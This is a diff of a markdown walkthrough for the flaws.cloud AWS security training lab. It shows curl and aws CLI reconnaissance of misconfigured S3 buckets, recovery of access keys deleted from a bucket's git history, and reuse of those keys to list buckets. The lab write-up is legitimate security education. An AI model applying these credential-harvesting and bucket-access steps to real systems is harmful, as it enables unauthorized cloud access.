@@ -3,6 +3,7 @@
 ## Level 1
 
 ### **HTTP reconnaissance**
+Let's take a look at what the HTTP headers look like instead of the web page itself for flaws.cloud Level 1:
 ```
 root@kali:~ # curl -sv flaws.cloud -o /dev/null 
 *   Trying 52.218.233.66:80...
@@ -27,45 +28,45 @@ root@kali:~ # curl -sv flaws.cloud -o /dev/null
 { [1593 bytes data]
 * Connection #0 to host flaws.cloud left intact
 ```
-This is sufficient evidence that this a static website hosted on AWS S3 (https://docs.aws.amazon.com/AmazonS3/latest/dev/WebsiteEndpoints.html). Another quick test would be
+Server header indicates AmazonS3; maybe it is a static website hosted on AWS S3 (https://docs.aws.amazon.com/AmazonS3/latest/dev/WebsiteEndpoints.html). Another quick test would be to play around with the Host header:
 ```
-root@kali:~ # curl -v 52.218.233.66 -H "Host: 52.218.233.66"
-*   Trying 52.218.233.66:80...
+root@kali:~ # curl -sv flaws.cloud -H "Host: TopSecretBucketNameThatMayOrMayNotExist"
+*   Trying 52.218.240.251:80...
 * TCP_NODELAY set
-* Connected to 52.218.233.66 (52.218.233.66) port 80 (#0)
+* Connected to flaws.cloud (52.218.240.251) port 80 (#0)
 > GET / HTTP/1.1
-> Host: 52.218.233.66
+> Host: TopSecretBucketNameThatMayOrMayNotExist
 > User-Agent: curl/7.68.0
 > Accept: */*
-> 
+>
 * Mark bundle as not supporting multiuse
-< HTTP/1.1 301 Moved Permanently
-< x-amz-error-code: WebsiteRedirect
-< x-amz-error-message: Request does not contain a bucket name.
-< x-amz-request-id: 93A1C57B295047D7
-< x-amz-id-2: n8pAd75u2fmtAt154fHQQbm6yjCkj3sFlHk+kKdZcRiFzUF2GVAjuya8xjhrzvU+gz7RayA4mZo=
-< Location: https://aws.amazon.com/s3/
+< HTTP/1.1 404 Not Found
+< x-amz-request-id: 8BCB1BF514F75F59
+< x-amz-id-2: fH3RjwiH4lpoZAbZNQt9QmeXovNNHuoivbx7k9wbv150UgoSs51/EZ/8InzVHQT2xHM+swgEfA4=
 < Content-Type: text/html; charset=utf-8
-< Content-Length: 348
-< Date: Sun, 27 Sep 2020 07:09:41 GMT
+< Content-Length: 386
+< Date: Sat, 31 Oct 2020 04:43:04 GMT
 < Server: AmazonS3
-< 
+<
 <html>
-<head><title>301 Moved Permanently</title></head>
+<head><title>404 Not Found</title></head>
 <body>
-<h1>301 Moved Permanently</h1>
+<h1>404 Not Found</h1>
 <ul>
-<li>Code: WebsiteRedirect</li>
-<li>Message: Request does not contain a bucket name.</li>
-<li>RequestId: 93A1C57B295047D7</li>
-<li>HostId: n8pAd75u2fmtAt154fHQQbm6yjCkj3sFlHk+kKdZcRiFzUF2GVAjuya8xjhrzvU+gz7RayA4mZo=</li>
+<li>Code: NoSuchBucket</li>
+<li>Message: The specified bucket does not exist</li>
+<li>BucketName: topsecretbucketnamethatmayormaynotexist</li>
+<li>RequestId: 8BCB1BF514F75F59</li>
+<li>HostId: fH3RjwiH4lpoZAbZNQt9QmeXovNNHuoivbx7k9wbv150UgoSs51/EZ/8InzVHQT2xHM+swgEfA4=</li>
 </ul>
 <hr/>
 </body>
 </html>
-* Connection #0 to host 52.218.233.66 left intact
+* Connection #0 to host flaws.cloud left intact
 ```
-S3 buckets can be directly accessed (https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingBucket.html) via HTTP(S). URL pattern is `http://<bucketname>.s3.amazonaws.com`. Due to misconfiguration, visiting this bucket gives us a directory structure:
+and observe the response from the web application, such as the x-amz- headers, as well as the body content indicating we are indeed interacting with the S3 service.
+
+Once we've determined that some content is hosted on S3, we can turn to examine the S3 bucket the content belongs to. In general S3 buckets can be directly accessed (https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingBucket.html) via HTTP(S). The URL pattern is `http://<bucketname>.s3.amazonaws.com`. Due to misconfiguration, visiting this bucket gives us a directory structure:
 ```
 root@kali:~ # curl -s flaws.cloud.s3.amazonaws.com | xmllint --format -
 <?xml version="1.0" encoding="UTF-8"?>        
@@ -136,7 +137,7 @@ root@kali:~/.aws # curl -sv level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud 
 { [625 bytes data]
 * Connection #0 to host level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud left intact
 ```
-But visiting the bucket URL does not reveal more content here; there seems to be more permission restriction:
+But visiting the bucket URL does not reveal more content:
 ```
 root@kali:~/.aws # curl -s level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com  | xmllint --format -
 <?xml version="1.0" encoding="UTF-8"?>
@@ -148,7 +149,7 @@ root@kali:~/.aws # curl -s level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s
 </Error>
 ```
 ### **AWS CLI access**
-There are a number of ways one can access any AWS resource. If the resource is (mistakenly or not) configured to allow public internet access, such as that in Level 1, then the access is via for example HTTP(S). Within AWS, there is also console access and programmatic access. A user can only access S3 buckets belonging to their own account with console access. But programmatic access can be less restrictive and to resources in a different account. To test the Level 2 bucket with programmatic access using awscli, first configure any user on your AWS console, and save the access key id and secret access key to ~/.aws/credentials
+There are a number of ways one can access any AWS resource. If the resource is (mistakenly or not) configured to allow public internet access, such as that in Level 1, then the access can be for example via any traditional HTTP(S) client, such as browsers or curl, and without any authentication. There are also authenticated access methods specific to AWS, such as the AWS console, and programmatic access using for example AWS CLI tooling. A user can only access S3 buckets belonging to their own account with console access. But programmatic access can be less restrictive and to resources in a different account. To test the Level 2 bucket with programmatic access using awscli, first configure a basic user on the AWS console of your own account, and save the access key id and secret access key to ~/.aws/credentials on our attack machine:
 ```
 [default]
 aws_access_key_id=AKIAIOSFODNN7EXAMPLE
@@ -173,7 +174,7 @@ Level 3 is at <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.clou
 ## Level 3
 
 ### HTTP reconnaissance
-Try accessing the bucket via HTTP directly
+Let's try accessing the Level 3 bucket via HTTP directly
 ```
 root@kali:~ # curl -s level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.amazonaws.com | xmllint --format - | grep '<Key>'
     <Key>.git/COMMIT_EDITMSG</Key>
@@ -213,7 +214,7 @@ root@kali:~ # curl -s level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.ama
     <Key>index.html</Key>
     <Key>robots.txt</Key>
 ```
-and looks like there is a git repository there. Pulling the entire bucket down:
+Looks like there is a git repository there. Pulling the entire bucket down:
 ```
 root@kali:~ # mkdir flaws.cloud.level3.temp
 root@kali:~ # cd flaws.cloud.level3.temp
@@ -246,7 +247,7 @@ index e3ae6dd..0000000
 -access_key AKIAJ366LIPB4IJKT7SA
 -secret_access_key OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys
 ```
-which seems to be a typical example where developer committed test credentials to the git repo and "removed" it later in a new commit. Adding the acces key id and secret access key to a new profile in the credentials file:
+It seems to be a typical example where developer committed test credentials to the git repo and "removed" it later in a new commit. Adding the access key id and secret access key to a new profile in the credentials file on our attack machine:
 ```
 [git]
 aws_access_key_id=AKIAJ366LIPB4IJKT7SA
@@ -307,7 +308,7 @@ root@kali:~/temp # aws --profile git s3api list-buckets
 
 ## Level 4
 
-Visiting the Level 4 URL above gives us more information about this level. An EC2 instance is hosting a web server at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. And it seems that this level is about EC2 snapshots.
+Visiting the Level 4 web page gives us more information about this level. An EC2 instance is hosting a web server at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. And it seems that this level is about EC2 snapshots.
 
 ### **EC2 snapshots**
 What can we do with snapshots?
